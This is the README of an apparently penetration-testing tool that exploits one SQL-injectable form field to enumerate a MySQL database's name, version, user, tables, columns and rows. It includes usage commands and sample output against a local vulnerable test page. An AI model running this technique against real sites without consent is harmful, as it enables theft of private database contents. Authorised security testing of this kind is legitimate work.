                    
                     ______  _     _  _    _____  _       _______ ______  _     _ ______
                    |  ___ \| |   | || |  / ___ \| |     (_______)  ___ \| |   | |  ___ \
                    | | _ | | |___| | \ \| |   | | |      _____  | |   | | |   | | | _ | |
                    | || || |\_____/   \ \ |   |_| |     |  ___) | |   | | |   | | || || |
                    | || || |  ___ _____) ) \____| |_____| |_____| |   | | |___| | || || |
                    |_||_||_| (___|______/ \_____)_______)_______)_|   |_|\______|_||_||_|


## What does this thing do?
It exploits a form field on a web page that is vulnerable to sql injection and retrieves various details about the back end database which is tied to it. 

Some of the details retrieved:

 - Database name
 - Database version
 - Current database user
 - Table names
 - Number of tables
 - Column names of each table
 - Number of columns in each table
 - Number of rows in each table
 - Row data of a particular column from a table

## Where to use it?
While penetration testing you may find yourself in a situation where you have only one single form field vulnerable to SQL injection, but would like to know the structure and contents of the database for further testing. 


## FEATURES
 - Specify the GET or POST data contents.
 - Specify the vulnerable field in the GET or POST data that will be sent .
 - Display output in a clean tabular format, similar to a MySQL shell.
 - Save all enumerated data to a file in json format.
 - All data is saved to the json file as it is received to retain any partial data in the event of a connection timeout/dropping.
 - Debugging option to see the GET, POST requests and their results.
 - Continue enumerating rows using a previously saved json file, removing the need to re-enumerate everything again from scratch.
 - Interactively select the column and tables when enumerating row data.
 - Progress bars!


## GETTING STARTED
**Install all requirements**

    $> pip install -r requirements.txt

**USAGE**

An example of a vulnerable php code is provided in the file "vuln.php" for a proof of concept. To test, setup an Apache server with PHP and MySQL database.

The php file connects to a database which has the schema available [here](https://dev.mysql.com/doc/employee/en/employees-installation.html)

    $> python3 mysql_enum.py -u "http://127.0.0.1/vuln.php" -d "vulnfield:" -v "vulnfield" -t "" -r get

     ______  _     _  _    _____  _       _______ ______  _     _ ______
    |  ___ \| |   | || |  / ___ \| |     (_______)  ___ \| |   | |  ___ \
    | | _ | | |___| | \ \| |   | | |      _____  | |   | | |   | | | _ | |
    | || || |\_____/   \ \ |   |_| |     |  ___) | |   | | |   | | || || |
    | || || |  ___ _____) ) \____| |_____| |_____| |   | | |___| | || || |
    |_||_||_| (___|______/ \_____)_______)_______)_|   |_|\______|_||_||_|
                                                                    @pyrod


    ENUMERATING DATABASE ...

    Enumerating DB Info
    Retreiving 'dbname': 100%|██████████████████████████████████████████████████████████████████| 4/4 [00:00<00:00, 118.55it/s]

    '8' tables found, Enumerating columns ...

    Table '8': 'titles': 100%|███████████████████████████████████████████████████████████████████| 8/8 [00:25<00:00,  4.80s/it]
    +-------------------+--------------------------------+-------------------------------------+-----------+<00:00, 150.42it/s]
    | DB Name: sampledb | DB User: testuser@127.0.0.1 | DB Version: 5.4.4 | Tables: 8 |
    +-------------------+--------------------------------+-------------------------------------+-----------+
    +-------------------+--------------------------------+-------------------------------------+-----------+

    ENUMERATED TABLES FOR: http://127.0.0.1/vuln.php

    +---+------------------------------+------------+--------------+
    | 1 | Table Name: current_dept_emp | Columns: 4 | Rows: 300024 |
    +---+------------------------------+------------+--------------+
    +---+------------------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+-----------------------+------------+--------------+
    | 2 | Table Name: employees | Columns: 6 | Rows: 300029 |
    +---+-----------------------+------------+--------------+
    +---+-----------------------+------------+--------------+
    +-----+------------+
    | No. | Columns    |
    +-----+------------+
    | 1   | emp_no     |
    | 2   | birth_date |
    | 3   | first_name |
    | 4   | last_name  |
    | 5   | gender     |
    | 6   | hire_date  |
    +-----+------------+
    +---+-------------------------+------------+---------+
    | 3 | Table Name: departments | Columns: 2 | Rows: 9 |
    +---+-------------------------+------------+---------+
    +---+-------------------------+------------+---------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | dept_no   |
    | 2   | dept_name |
    +-----+-----------+
    +---+--------------------+------------+--------------+
    | 4 | Table Name: titles | Columns: 4 | Rows: 443308 |
    +---+--------------------+------------+--------------+
    +---+--------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | title     |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+----------------------+------------+---------------+
    | 5 | Table Name: salaries | Columns: 4 | Rows: 2844047 |
    +---+----------------------+------------+---------------+
    +---+----------------------+------------+---------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | salary    |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+--------------------------+------------+----------+
    | 6 | Table Name: dept_manager | Columns: 4 | Rows: 24 |
    +---+--------------------------+------------+----------+
    +---+--------------------------+------------+----------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+----------------------------------+------------+--------------+
    | 7 | Table Name: dept_emp_latest_date | Columns: 3 | Rows: 300024 |
    +---+----------------------------------+------------+--------------+
    +---+----------------------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | from_date |
    | 3   | to_date   |
    +-----+-----------+
    +---+----------------------+------------+--------------+
    | 8 | Table Name: dept_emp | Columns: 4 | Rows: 331603 |
    +---+----------------------+------------+--------------+
    +---+----------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+

Continue enumerating table rows from a previous enumeration session

    $python3 mysql_enum.py -f -u "http://127.0.0.1"

         ______  _     _  _    _____  _       _______ ______  _     _ ______
        |  ___ \| |   | || |  / ___ \| |     (_______)  ___ \| |   | |  ___ \
        | | _ | | |___| | \ \| |   | | |      _____  | |   | | |   | | | _ | |
        | || || |\_____/   \ \ |   |_| |     |  ___) | |   | | |   | | || || |
        | || || |  ___ _____) ) \____| |_____| |_____| |   | | |___| | || || |
        |_||_||_| (___|______/ \_____)_______)_______)_|   |_|\______|_||_||_|
                                                                        @pyrod

    +-------------------+---------------------------------+-------------------------------------+-----------+
    | DB Name: sampledb | DB User: testuser@192.168.1.120 | DB Version: 5.7.26-0ubuntu0.16.04.1 | Tables: 8 |
    +-------------------+---------------------------------+-------------------------------------+-----------+
    +-------------------+---------------------------------+-------------------------------------+-----------+

    ENUMERATED TABLES FOR: http://127.0.0.1/vuln.php

    +---+------------------------------+------------+--------------+
    | 1 | Table Name: current_dept_emp | Columns: 4 | Rows: 300024 |
    +---+------------------------------+------------+--------------+
    +---+------------------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+-------------------------+------------+---------+
    | 2 | Table Name: departments | Columns: 2 | Rows: 9 |
    +---+-------------------------+------------+---------+
    +---+-------------------------+------------+---------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | dept_no   |
    | 2   | dept_name |
    +-----+-----------+
    +---+----------------------+------------+--------------+
    | 3 | Table Name: dept_emp | Columns: 4 | Rows: 331603 |
    +---+----------------------+------------+--------------+
    +---+----------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+----------------------------------+------------+--------------+
    | 4 | Table Name: dept_emp_latest_date | Columns: 3 | Rows: 300024 |
    +---+----------------------------------+------------+--------------+
    +---+----------------------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | from_date |
    | 3   | to_date   |
    +-----+-----------+
    +---+--------------------------+------------+----------+
    | 5 | Table Name: dept_manager | Columns: 4 | Rows: 24 |
    +---+--------------------------+------------+----------+
    +---+--------------------------+------------+----------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+-----------------------+------------+--------------+
    | 6 | Table Name: employees | Columns: 6 | Rows: 300029 |
    +---+-----------------------+------------+--------------+
    +---+-----------------------+------------+--------------+
    +-----+------------+
    | No. | Columns    |
    +-----+------------+
    | 1   | emp_no     |
    | 2   | birth_date |
    | 3   | first_name |
    | 4   | last_name  |
    | 5   | gender     |
    | 6   | hire_date  |
    +-----+------------+
    +---+----------------------+------------+---------------+
    | 7 | Table Name: salaries | Columns: 4 | Rows: 2844047 |
    +---+----------------------+------------+---------------+
    +---+----------------------+------------+---------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | salary    |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    +---+--------------------+------------+--------------+
    | 8 | Table Name: titles | Columns: 4 | Rows: 443308 |
    +---+--------------------+------------+--------------+
    +---+--------------------+------------+--------------+
    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | title     |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    Enumerate rows? [y/n, default:n]: y
    +-----+----------------------+
    | No. | Tables               |
    +-----+----------------------+
    | 1   | current_dept_emp     |
    | 2   | departments          |
    | 3   | dept_emp             |
    | 4   | dept_emp_latest_date |
    | 5   | dept_manager         |
    | 6   | employees            |
    | 7   | salaries             |
    | 8   | titles               |
    +-----+----------------------+
    Select Table [1-8]: 2

    Table selected: departments

    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | dept_no   |
    | 2   | dept_name |
    +-----+-----------+
    Select Column to enumerate [1-2]: 2
    Number of rows to enumerate [Total: 9]:

    Column selected: dept_name


    Enumerating rows for departments.dept_name

    Enumerated row data: 'Sales': 100%|█████████████████████████████████████████████████████████| 9/9 [00:00<00:00, 169.55it/s]
    +-----+--------------------+
    | No. | dept_name          |
    +-----+--------------------+
    | 1   | Customer Service   |
    | 2   | Development        |
    | 3   | Finance            |
    | 4   | Human Resources    |
    | 5   | Marketing          |
    | 6   | Production         |
    | 7   | Quality Management |
    | 8   | Research           |
    | 9   | Sales              |
    +-----+--------------------+
    Enumerate rows for another table? [y/n, default:n]: y
    +-----+----------------------+
    | No. | Tables               |
    +-----+----------------------+
    | 1   | current_dept_emp     |
    | 2   | departments          |
    | 3   | dept_emp             |
    | 4   | dept_emp_latest_date |
    | 5   | dept_manager         |
    | 6   | employees            |
    | 7   | salaries             |
    | 8   | titles               |
    +-----+----------------------+
    Select Table [1-8]: 5

    Table selected: dept_manager

    +-----+-----------+
    | No. | Columns   |
    +-----+-----------+
    | 1   | emp_no    |
    | 2   | dept_no   |
    | 3   | from_date |
    | 4   | to_date   |
    +-----+-----------+
    Select Column to enumerate [1-4]: 3
    Number of rows to enumerate [Total: 24]:

    Column selected: from_date


    Enumerating rows for dept_manager.from_date

    Enumerated row data: '1996-01-03': 100%|██████████████████████████████████████████████████| 24/24 [00:00<00:00, 168.86it/s]
    +-----+------------+
    | No. | from_date  |
    +-----+------------+
    | 1   | 1985-01-01 |
    | 2   | 1991-10-01 |
    | 3   | 1985-01-01 |
    | 4   | 1989-12-17 |
    | 5   | 1985-01-01 |
    | 6   | 1992-03-21 |
    | 7   | 1985-01-01 |
    | 8   | 1988-09-09 |
    | 9   | 1992-08-02 |
    | 10  | 1996-08-30 |
    | 11  | 1985-01-01 |
    | 12  | 1992-04-25 |
    | 13  | 1985-01-01 |
    | 14  | 1989-05-06 |
    | 15  | 1991-09-12 |
    | 16  | 1994-06-28 |
    | 17  | 1985-01-01 |
    | 18  | 1991-03-07 |
    | 19  | 1985-01-01 |
    | 20  | 1991-04-08 |
    | 21  | 1985-01-01 |
    | 22  | 1988-10-17 |
    | 23  | 1992-09-08 |
    | 24  | 1996-01-03 |
    +-----+------------+
    Enumerate rows for another table? [y/n, default:n]: n

**JSON OUTPUT**

Json output is generated in the following format.

    {
        "date": "2019-08-17 18:26:59.755343",
        "params": {
            "url": "http://127.0.0.1/vuln.php",
            "data": {
                "vulnfield": ""
            },
            "request_type": "get",
            "vuln_field": "vulnfield",
            "limit": "",
            "terminator": "",
            "debug": null
        },
        "info": {
            "dbname": "sampledb",
            "username": "testuser@192.168.1.120",
            "version": "5.7.26-0ubuntu0.16.04.1",
            "table_count": "8"
        },
        "tables": {
            "current_dept_emp": {
                "row_count": "300024",
                "col_count": "4",
                "cols": {
                    "emp_no": null,
                    "dept_no": null,
                    "from_date": null,
                    "to_date": null
                }
            },
            "departments": {
                "row_count": "9",
                "col_count": "2",
                "cols": {
                    "dept_no": null,
                    "dept_name": null
                }
            },
            "dept_emp": {
                "row_count": "331603",
                "col_count": "4",
                "cols": {
                    "emp_no": null,
                    "dept_no": null,
                    "from_date": null,
                    "to_date": null
                }
            },
            "dept_emp_latest_date": {
                "row_count": "300024",
                "col_count": "3",
                "cols": {
                    "emp_no": null,
                    "from_date": null,
                    "to_date": null
                }
            },
            "dept_manager": {
                "row_count": "24",
                "col_count": "4",
                "cols": {
                    "emp_no": null,
                    "dept_no": null,
                    "from_date": null,
                    "to_date": null
                }
            },
            "employees": {
                "row_count": "300029",
                "col_count": "6",
                "cols": {
                    "emp_no": null,
                    "birth_date": null,
                    "first_name": null,
                    "last_name": null,
                    "gender": null,
                    "hire_date": null
                }
            },
            "salaries": {
                "row_count": "2844047",
                "col_count": "4",
                "cols": {
                    "emp_no": null,
                    "salary": null,
                    "from_date": null,
                    "to_date": null
                }
            },
            "titles": {
                "row_count": "443308",
                "col_count": "4",
                "cols": {
                    "emp_no": null,
                    "title": null,
                    "from_date": null,
                    "to_date": null
                }
            }
        }
    }

## TO DO
1. ~~Enumerate row contents for tables based on user selection for a particular table and column.~~ Done.
2. Code refactoring to implement a plugin architecture.
3. Multi threading, while keeping the json output format intact.
4. Test suite integration.

## CONTRIBUTING
Contributions in any form are welcome. It can be anything from correcting grammer or spellings in the documentation to adding additional enumeration functions or tests. Our goal here is to make something robust and useful.

## DISCLAIMER
All information, techniques and tools described herein are for educational purposes only. Use anything here at your own discretion, I cannot be held responsible for any damages caused to any systems or yourselves legally. 

Usage of all tools, computer code and techniques described here for testing security of systems owned by any individuals or Organisations without their prior consent is highly illegal.

It is your responsibility to obey all applicable local, state and federal laws. I assume and accept no liability and will not be responsible for any misuse or damage caused by using information herein.

## LICENSE
**GNU General Public License v3.0**

This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.  If not, see <https://www.gnu.org/licenses/>
